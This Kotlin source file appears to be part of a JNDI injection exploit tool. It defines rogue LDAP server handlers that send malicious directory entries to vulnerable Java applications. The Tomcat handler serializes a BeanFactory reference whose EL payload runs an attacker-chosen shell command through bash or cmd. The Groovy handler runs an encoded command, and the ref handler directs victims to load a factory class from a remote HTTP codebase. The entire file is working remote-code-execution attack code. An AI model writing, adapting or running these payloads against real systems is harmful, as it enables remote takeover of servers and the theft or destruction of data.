package ldap

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.sdk.Entry
import com.unboundid.ldap.sdk.LDAPResult
import com.unboundid.ldap.sdk.ResultCode
import org.apache.naming.ResourceRef
import util.Options
import util.base46cmd
import util.serialize
import javax.naming.StringRefAddr

fun LDAPServer.tomcat(result: InMemoryInterceptedSearchResult, base: String) {
    val jsStr = """
        var strs=new Array(3);
        if(java.io.File.separator.equals('/')) {
            strs[0]='/bin/bash';
            strs[1]='-c';
            strs[2]='${Options.command}';
        } else {
            strs[0]='cmd';
            strs[1]='/C';
            strs[2]='${Options.command}';
        }
        java.lang.Runtime.getRuntime().exec(strs);
    """.trimIndent()

    val payload = """
        {
            "".getClass().forName("javax.script.ScriptEngineManager")
            .newInstance().getEngineByName("JavaScript")
            .eval("$jsStr")
        }
    """.trimIndent().replace("\n", "")

    val ref = ResourceRef(
        "javax.el.ELProcessor", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null
    ).apply {
        add(StringRefAddr("forceString", "x=eval"))
        add(StringRefAddr("x", payload))
    }
    val entry = Entry(base).apply {
        addAttribute("javaClassName", "java.lang.String")
        addAttribute("javaSerializedData", serialize(ref))
    }

    result.sendSearchEntry(entry)
    result.result = LDAPResult(0, ResultCode.SUCCESS)
}

fun LDAPServer.ref(result: InMemoryInterceptedSearchResult, base: String) {
    val codeBaseUrl = "http://${Options.address}:${Options.httpPort}/"

    val entry = Entry(base)
    val javaFactory = base.substringAfterLast("/")

    entry.run {
        addAttribute("javaClassName", "foo")
        addAttribute("javaCodeBase", codeBaseUrl)
        addAttribute("objectClass", "javaNamingReference")
        addAttribute("javaFactory", javaFactory)
    }
    result.run {
        sendSearchEntry(entry)
        setResult(LDAPResult(0, ResultCode.SUCCESS))
    }
}

fun LDAPServer.groovy(result: InMemoryInterceptedSearchResult, base: String) {
    val payload = "'${base46cmd(Options.command)}'.execute()"

    val ref = ResourceRef(
        "groovy.lang.GroovyShell", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null
    ).apply {
        add(StringRefAddr("forceString", "x=evaluate"))
        add(StringRefAddr("x", payload))
    }
    val entry = Entry(base).apply {
        addAttribute("javaClassName", "java.lang.String")
        addAttribute("javaSerializedData", serialize(ref))
    }

    result.sendSearchEntry(entry)
    result.result = LDAPResult(0, ResultCode.SUCCESS)
}
